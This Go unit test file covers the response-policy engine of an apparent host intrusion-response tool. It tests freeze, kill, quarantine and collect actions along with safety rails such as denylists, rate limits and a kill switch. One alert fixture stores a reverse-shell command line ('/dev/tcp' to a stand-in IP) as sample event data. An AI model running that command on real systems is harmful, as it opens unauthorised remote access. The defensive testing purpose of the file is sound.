package response

import (
	"reflect"
	"testing"
	"time"

	"github.com/conor-sometimes/banken/internal/alert"
	"github.com/conor-sometimes/banken/internal/event"
)

// enforcePolicy is a small enforce-mode policy exercising every action kind.
const enforcePolicy = `
mode: enforce
minLevel: high
enforceSources: [auditd, laurel]
allowRoot: false
rateLimit:
  perRun: 3
  perHour: 10
quarantine:
  dir: /var/lib/banken/quarantine
  allowPaths: [/tmp, /home, /root]
actions:
  - name: freeze-revshell
    rules: [reverse_shell]
    action: freeze
    scope: tree
  - name: freeze-c2-by-tag
    tag: attack.command-and-control
    action: freeze
  - name: kill-miner
    rules: [xmrig_dropper]
    action: kill
    scope: tree
  - name: quarantine-dropper
    rules: [download_ip_to_tmp]
    action: quarantine
    target: targetFilename
  - name: collect-suspicious
    rules: [suspicious_exec]
    action: collect
`

// observePolicy is the same policy in observe mode.
const observePolicy = `
mode: observe
minLevel: high
enforceSources: [auditd, laurel]
actions:
  - name: freeze-revshell
    rules: [reverse_shell]
    action: freeze
    scope: tree
`

func mustPolicy(t *testing.T, yml string) Policy {
	t.Helper()
	p, err := ParsePolicy([]byte(yml))
	if err != nil {
		t.Fatalf("ParsePolicy: %v", err)
	}
	return p
}

// procAlert builds a reverse_shell alert from an auditd event with a pid.
func procAlert() alert.Alert {
	return alert.Alert{
		Kind:   alert.KindSigma,
		Rule:   "reverse_shell",
		Level:  "high",
		Source: "auditd",
		Tags:   []string{"attack.command-and-control", "attack.t1059.004"},
		Time:   time.Date(2026, 10, 31, 6, 10, 41, 0, time.UTC),
		Event: event.Event{
			Source:      "auditd",
			Image:       "/tmp/.x/sh",
			CommandLine: "sh -i >& /dev/tcp/192.0.2.1/4444 0>&1",
			User:        "u",
			PID:         4242,
			PPID:        4100,
			Time:        time.Date(2026, 10, 31, 6, 10, 41, 0, time.UTC),
		},
	}
}

func TestDecide(t *testing.T) {
	enforce := mustPolicy(t, enforcePolicy)
	observe := mustPolicy(t, observePolicy)

	tests := []struct {
		name     string
		in       Input
		wantAct  Action
		wantInt  Action
		wantRail Rail
		wantEnt  string
	}{
		{
			name:     "enforce freeze clean",
			in:       Input{Alert: procAlert(), Policy: enforce, Budget: Budget{RunLimit: 3, HourLimit: 10}},
			wantAct:  ActionFreeze,
			wantInt:  ActionFreeze,
			wantRail: RailNone,
			wantEnt:  "freeze-revshell",
		},
		{
			name:     "observe downgrades to none",
			in:       Input{Alert: procAlert(), Policy: observe, Budget: Budget{RunLimit: 3, HourLimit: 10}},
			wantAct:  ActionNone,
			wantInt:  ActionFreeze,
			wantRail: RailObserve,
			wantEnt:  "freeze-revshell",
		},
		{
			name: "no policy match",
			in: func() Input {
				a := procAlert()
				a.Rule = "some_other_rule"
				a.Tags = nil
				return Input{Alert: a, Policy: enforce, Budget: Budget{RunLimit: 3, HourLimit: 10}}
			}(),
			wantAct:  ActionNone,
			wantInt:  ActionNone,
			wantRail: RailNoPolicyMatch,
		},
		{
			name: "below min level",
			in: func() Input {
				a := procAlert()
				a.Level = "low"
				return Input{Alert: a, Policy: enforce, Budget: Budget{RunLimit: 3, HourLimit: 10}}
			}(),
			wantAct:  ActionNone,
			wantInt:  ActionFreeze,
			wantRail: RailBelowMinLevel,
			wantEnt:  "freeze-revshell",
		},
		{
			name: "untrusted source",
			in: func() Input {
				a := procAlert()
				a.Source = "generic"
				return Input{Alert: a, Policy: enforce, Budget: Budget{RunLimit: 3, HourLimit: 10}}
			}(),
			wantAct:  ActionNone,
			wantInt:  ActionFreeze,
			wantRail: RailUntrustedSource,
			wantEnt:  "freeze-revshell",
		},
		{
			name: "untargetable no pid",
			in: func() Input {
				a := procAlert()
				a.Event.PID = 0
				return Input{Alert: a, Policy: enforce, Budget: Budget{RunLimit: 3, HourLimit: 10}}
			}(),
			wantAct:  ActionNone,
			wantInt:  ActionFreeze,
			wantRail: RailUntargetable,
			wantEnt:  "freeze-revshell",
		},
		{
			name: "denylist pid 1",
			in: func() Input {
				a := procAlert()
				a.Event.PID = 1
				return Input{Alert: a, Policy: enforce, Budget: Budget{RunLimit: 3, HourLimit: 10}}
			}(),
			wantAct:  ActionNone,
			wantInt:  ActionFreeze,
			wantRail: RailDenylist,
			wantEnt:  "freeze-revshell",
		},
		{
			name: "denylist sshd by name",
			in: func() Input {
				a := procAlert()
				a.Event.Image = "/usr/bin/sshd"
				return Input{Alert: a, Policy: enforce, Budget: Budget{RunLimit: 3, HourLimit: 10}}
			}(),
			wantAct:  ActionNone,
			wantInt:  ActionFreeze,
			wantRail: RailDenylist,
			wantEnt:  "freeze-revshell",
		},
		{
			name: "denylist banken self",
			in: func() Input {
				a := procAlert()
				a.Event.Image = "/run/current-system/sw/bin/banken"
				return Input{
					Alert:  a,
					Policy: enforce,
					Self:   SelfIdentity{Exe: "/run/current-system/sw/bin/banken"},
					Budget: Budget{RunLimit: 3, HourLimit: 10},
				}
			}(),
			wantAct:  ActionNone,
			wantInt:  ActionFreeze,
			wantRail: RailDenylist,
			wantEnt:  "freeze-revshell",
		},
		{
			name: "denylist root when allowRoot false",
			in: func() Input {
				a := procAlert()
				a.Event.User = "root"
				return Input{Alert: a, Policy: enforce, Budget: Budget{RunLimit: 3, HourLimit: 10}}
			}(),
			wantAct:  ActionNone,
			wantInt:  ActionFreeze,
			wantRail: RailDenylist,
			wantEnt:  "freeze-revshell",
		},
		{
			name: "duplicate target",
			in: func() Input {
				a := procAlert()
				return Input{
					Alert:  a,
					Policy: enforce,
					Budget: Budget{RunLimit: 3, HourLimit: 10},
					Seen:   []Target{{Process: &ProcessRef{PID: 4242, Image: "/tmp/.x/sh"}}},
				}
			}(),
			wantAct:  ActionNone,
			wantInt:  ActionFreeze,
			wantRail: RailDuplicate,
			wantEnt:  "freeze-revshell",
		},
		{
			name:     "rate limit per run",
			in:       Input{Alert: procAlert(), Policy: enforce, Budget: Budget{RunUsed: 3, RunLimit: 3, HourLimit: 10}},
			wantAct:  ActionNone,
			wantInt:  ActionFreeze,
			wantRail: RailRateLimit,
			wantEnt:  "freeze-revshell",
		},
		{
			name:     "rate limit per hour",
			in:       Input{Alert: procAlert(), Policy: enforce, Budget: Budget{RunLimit: 3, HourUsed: 10, HourLimit: 10}},
			wantAct:  ActionNone,
			wantInt:  ActionFreeze,
			wantRail: RailRateLimit,
			wantEnt:  "freeze-revshell",
		},
		{
			name:     "kill switch",
			in:       Input{Alert: procAlert(), Policy: enforce, KillSwitch: true, Budget: Budget{RunLimit: 3, HourLimit: 10}},
			wantAct:  ActionNone,
			wantInt:  ActionFreeze,
			wantRail: RailKillSwitch,
			wantEnt:  "freeze-revshell",
		},
		{
			name: "tag-only freeze matches second entry",
			in: func() Input {
				a := procAlert()
				a.Rule = "unknown_rule"                         // skip the rules-pinned first entry
				a.Tags = []string{"attack.command-and-control"} // hit the tag entry
				return Input{Alert: a, Policy: enforce, Budget: Budget{RunLimit: 3, HourLimit: 10}}
			}(),
			wantAct:  ActionFreeze,
			wantInt:  ActionFreeze,
			wantRail: RailNone,
			wantEnt:  "freeze-c2-by-tag",
		},
		{
			name: "kill enforce",
			in: func() Input {
				a := procAlert()
				a.Rule = "xmrig_dropper"
				a.Tags = nil
				return Input{Alert: a, Policy: enforce, Budget: Budget{RunLimit: 3, HourLimit: 10}}
			}(),
			wantAct:  ActionKill,
			wantInt:  ActionKill,
			wantRail: RailNone,
			wantEnt:  "kill-miner",
		},
		{
			name: "quarantine enforce",
			in: func() Input {
				a := procAlert()
				a.Rule = "download_ip_to_tmp"
				a.Tags = nil
				a.Event.TargetFilename = "/tmp/loot"
				return Input{Alert: a, Policy: enforce, Budget: Budget{RunLimit: 3, HourLimit: 10}}
			}(),
			wantAct:  ActionQuarantine,
			wantInt:  ActionQuarantine,
			wantRail: RailNone,
			wantEnt:  "quarantine-dropper",
		},
		{
			name: "quarantine path not allowed",
			in: func() Input {
				a := procAlert()
				a.Rule = "download_ip_to_tmp"
				a.Tags = nil
				a.Event.TargetFilename = "/nix/store/abc/evil"
				return Input{Alert: a, Policy: enforce, Budget: Budget{RunLimit: 3, HourLimit: 10}}
			}(),
			wantAct:  ActionNone,
			wantInt:  ActionQuarantine,
			wantRail: RailUntargetable,
			wantEnt:  "quarantine-dropper",
		},
		{
			name: "collect enforce",
			in: func() Input {
				a := procAlert()
				a.Rule = "suspicious_exec"
				a.Tags = nil
				return Input{Alert: a, Policy: enforce, Budget: Budget{RunLimit: 3, HourLimit: 10}}
			}(),
			wantAct:  ActionCollect,
			wantInt:  ActionCollect,
			wantRail: RailNone,
			wantEnt:  "collect-suspicious",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := Decide(tt.in)
			if got.Action != tt.wantAct {
				t.Errorf("Action = %q, want %q (reason: %s)", got.Action, tt.wantAct, got.Reason)
			}
			if got.Intended != tt.wantInt {
				t.Errorf("Intended = %q, want %q", got.Intended, tt.wantInt)
			}
			if got.Rail != tt.wantRail {
				t.Errorf("Rail = %q, want %q (reason: %s)", got.Rail, tt.wantRail, got.Reason)
			}
			if tt.wantEnt != "" && got.Entry != tt.wantEnt {
				t.Errorf("Entry = %q, want %q", got.Entry, tt.wantEnt)
			}
			if got.Reason == "" {
				t.Errorf("Reason is empty; every decision must carry one")
			}
			// Purity: a second call must be identical.
			if again := Decide(tt.in); !reflect.DeepEqual(got, again) {
				t.Errorf("Decide is not pure: %+v != %+v", got, again)
			}
		})
	}
}

// TestEveryRailReached asserts the suite exercises every Rail constant, the
// same forcing function a rule-fixture corpus provides.
func TestEveryRailReached(t *testing.T) {
	enforce := mustPolicy(t, enforcePolicy)
	observe := mustPolicy(t, observePolicy)
	reached := map[Rail]bool{}

	record := func(in Input) { reached[Decide(in).Rail] = true }

	base := Budget{RunLimit: 3, HourLimit: 10}
	// RailNone and RailObserve.
	record(Input{Alert: procAlert(), Policy: enforce, Budget: base})
	record(Input{Alert: procAlert(), Policy: observe, Budget: base})
	// no-policy-match.
	noMatch := procAlert()
	noMatch.Rule, noMatch.Tags = "nope", nil
	record(Input{Alert: noMatch, Policy: enforce, Budget: base})
	// below-min-level.
	low := procAlert()
	low.Level = "low"
	record(Input{Alert: low, Policy: enforce, Budget: base})
	// untrusted-source.
	gen := procAlert()
	gen.Source = "generic"
	record(Input{Alert: gen, Policy: enforce, Budget: base})
	// untargetable.
	nopid := procAlert()
	nopid.Event.PID = 0
	record(Input{Alert: nopid, Policy: enforce, Budget: base})
	// denylist.
	deny := procAlert()
	deny.Event.PID = 1
	record(Input{Alert: deny, Policy: enforce, Budget: base})
	// duplicate.
	record(Input{Alert: procAlert(), Policy: enforce, Budget: base, Seen: []Target{{Process: &ProcessRef{PID: 4242, Image: "/tmp/.x/sh"}}}})
	// rate-limit.
	record(Input{Alert: procAlert(), Policy: enforce, Budget: Budget{RunUsed: 3, RunLimit: 3, HourLimit: 10}})
	// kill-switch.
	record(Input{Alert: procAlert(), Policy: enforce, KillSwitch: true, Budget: base})

	for _, r := range []Rail{
		RailNone, RailNoPolicyMatch, RailBelowMinLevel, RailUntrustedSource,
		RailUntargetable, RailDenylist, RailDuplicate, RailRateLimit,
		RailKillSwitch, RailObserve,
	} {
		if !reached[r] {
			t.Errorf("rail %q is never reached by the test corpus", r)
		}
	}
}
